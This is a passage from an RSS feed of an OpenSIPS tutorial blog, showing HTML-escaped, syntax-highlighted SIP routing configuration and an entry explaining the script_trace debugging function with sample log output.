&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# (in case, it does not work, use the following command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# with proper names and addresses in it)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use digest authentication&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#if (!www_authorize(&amp;#34;opensips.org&amp;#34;, &amp;#34;subscriber&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#	www_challenge(&amp;#34;opensips.org&amp;#34;, &amp;#34;0&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound alias\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# native SIP destinations are handled using our USRLOC DB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: usrloc applied\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route[1]&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# send it out now; use stateful forwarding as it works reliably
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# even for UDP2TCP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>script_trace 打印opensips的脚本执行过程</title>
      <link>https://wdd.js.org/opensips/ch7/cfg-trace/</link>
      <pubDate>Wed, 27 May 2020 16:54:47 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/cfg-trace/</guid>
      <description>&lt;p&gt;script_trace是核心函数，不需要引入模块。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script_trace([log_level,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;pv_format_string[,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;info_string]])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;This&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;start&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;tracing&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;this&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;helps&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;better&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;understand&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;flow&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;execution&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;OpenSIPS&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;what&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;executed,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;what&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;it&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;etc.&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Moreover,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;you&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;can&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;also&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;trace&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;values&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;pseudo-variables,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;execution&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;progresses.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;blocks&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;tracing&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;enabled&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;will&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;line&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;each&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;individual&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;action&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;that&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;done&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(e.g.&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;assignments,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;conditional&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;tests,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;module&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;functions,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;core&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;functions,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;etc.).&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Multiple&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;pseudo-variables&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;can&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;be&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;monitored&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;specifying&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;pv_format_string&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(e.g.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;$ru---$avp(var1)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;logs&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;produced&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;multiple/different&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;traced&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;regions&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;your&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;can&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;be&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;differentiated&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(tagged)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;specifying&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;an&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;additional&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;plain&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;info_string&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;3rd&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;parameter.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;To&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;disable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;tracing,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;just&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;script_trace().&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Otherwise,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;tracing&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;will&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;automatically&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stop&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;top&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Example of usage&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    script_trace&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; 1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rm&lt;span style=&#34;color:#e6db74&#34;&gt; from &lt;/span&gt;$si&lt;span style=&#34;color:#e6db74&#34;&gt;, ruri=&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;me&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;will produce&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 578][me][module consume_credentials] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;111211@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 581][me][core setsflag] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;111211@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 583][me][assign equal] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;111211@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 592][me][core if] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;tester@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 585][me][module is_avp_set] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;tester@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 589][me][core if] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;tester@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 586][me][module is_method] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;tester@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 587][me][module trace_dialog] -&amp;gt; (INVITE 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;tester@opensips.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[line 590][me][core setflag] -&amp;gt; (INVITE from 127.0.0.1 , ruri=sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;tester@opensips.org) 
